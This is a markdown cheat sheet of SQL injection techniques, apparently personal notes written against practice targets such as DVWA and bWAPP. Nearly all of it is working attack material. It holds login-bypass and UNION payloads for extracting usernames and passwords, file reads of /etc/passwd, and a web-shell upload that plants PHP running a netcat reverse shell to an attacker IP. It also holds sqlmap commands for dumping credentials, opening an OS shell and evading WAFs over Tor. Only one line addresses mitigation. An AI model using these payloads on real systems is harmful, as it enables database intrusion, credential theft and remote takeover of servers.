# SQL Injection

## Cheat Sheets
- [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Types
- MySQL
  - Error Based
    - ```'``` & ```"``` & ```\``` & ```)``` & tilda
  - Blind 
    - Boolean
      - True: ```id=1" and 1=1--```
      - False: ```id=1" and 1=2--```
      - Other
        - ```id=1' and 1=1--+```
        - ```id=1' and 1=1#```  
    - Time Based
      - ```id=1' and sleep(5)--```
      - ```id=';waitfor delay '0:0:5'--```

## Exploitation
- Login Bypass
  - Username : ```administrator'--``` , ```admin'#``` 
  - password : ```1' or 1=1#```

- Where cluase : ```' OR 1=1--``` 

- UNION
  - ```' UNION SELECT NULL--``` , ```' UNION SELECT NULL,NULL--``` , ...
    - determining the number of columns  
  - ```' UNION SELECT 'abcdef',NULL,NULL--``` , ```' UNION SELECT NULL,'abcdef',NULL--``` , ...
    - finding a column containing text
  - ```' UNION SELECT username,password FROM users--```
    - retrive data from other tables
  - ```' UNION SELECT NULL,username||'~'||password FROM users--```
    - retrive multiple values in a single columns
  - querying the database type and version
    - Oracle : ```' UNION SELECT BANNER,NULL FROM v$version--```
    - MYSQL & MSSQL : ```' UNION SELECT @@version, NULL#```  (must use Burp because of #)
  - listing the database contents
    - non-Oracle
      - ```' UNION SELECT table_name, NULL FROM information_schema.tables--```
      - ```' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--```
      - ```' UNION SELECT username, password FROM users```
    - Oracle
      - ```' UNION SELECT table_name,NULL FROM all_tables--```
      - ```' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--```
      - ```' UNION SELECT USERNAME, PASSWORD FROM+USERS--```

## Payloads
```
a'or'1'='1
a' or '1'='1
a' or '1'='1'--
a' or '1'='1'#
a' or '1'='1'%23
a' or 1=1%23
1 or 1=1
1 or 1=1 limit 2,1
a'%09or%09'1'='1
a'/**/or/**/'1'='1
2 or 1=1
2%0Aor 1=1
` desc %23
IF(0,name,age)
' or 1=1#
' or 1=1--
' or 1=1 LIMIT 1 #
2 union all select * from users
```

## Tips
- True statement: ```aNd 1=1``` & ```aNd 21=21``` & ```orDeR bY 1```
- False statement: ```dNd 0=1``` & ```anD 9=2``` & ```ordEr bY 1000000000000```
- Space: ```+``` & ```/**/``` & ```%20```
- Comment: ```/*``` & ```//``` & ```;//``` & ```#``` & ```%23```

## Exploit
- Data Extracting 
  - Seleting database version, Database, user
    - ```?page=user-info.php&username=z' union select 1,database(),user(),version(),5%23``` 
  - Database tables 
    - ```... union select 1,table_name,null,null,5 from information_schema.tables``` 
    - ```... union select 1,table_name,null,null,5 from information_schema.tables where table_schema='owasp10'``` 
  - Table Columns
    - ```... union select 1,column_name,null,null,5 from information_schema.columns where table_name='accounts'``` 
  - Selecting data from table 
    - ```... union select 1,username,password,is_admin,5 from accounts``` 
  - Reading files
    - ```... union select null,load_file('/etc/passwd'),null,null,null``` 
  - Writing files
    - ```UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*``` 

- Shell upload 
  - Payload 
    - ```?page=user-info.php&username=z' union select '<?passthru("nc -e /bin/sh 10.20.14.208 8080");?>',null into outfile '/tmp/reverse.php'``` 
  - Listen on attacker machin
    - ```nc -vv -l -p 8080```
  - Run backdoor
    - ```10.20.14.211/dvwa/vulnerabilities/fi/?page=../../../../../tmp/reverse.php```

## Mitigation
- Use parametrized statements, separate data from sql code


## SQLMAP
- Usage
  - ```sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title```
    - Define "title" as the test parameter (input string was passed as value of title) 
  - ``` sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title --dbs```
    - Get a list of databases present on the database server 
  - ```sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP --tables``` 
    - Get a list of tables for database bWAPP
  - ```sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users --columns``` 
    - Get the list of columns in the users table of bWAPP database
  - ```sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump``` 
    - Dump password and email for admin from the users table. Press 'n' twice when prompted

- Burp & SQLMAP
  - Intercept request in Burp, Right-click on it and choose "Copy to file"
  - ```sqlmap -r request -p title```

- Switches
  - Tor
    - ```--tor```
  - Shell
    - ```sqlmap -u "..." --sql-shell```
    - ```sqlmap -u "..." --os-shell```
  - WAF Bypass 
    - ```--tamper=space2dash, hex2char --dbs```
    - Path: /usr/share/sqlmap/tamper 
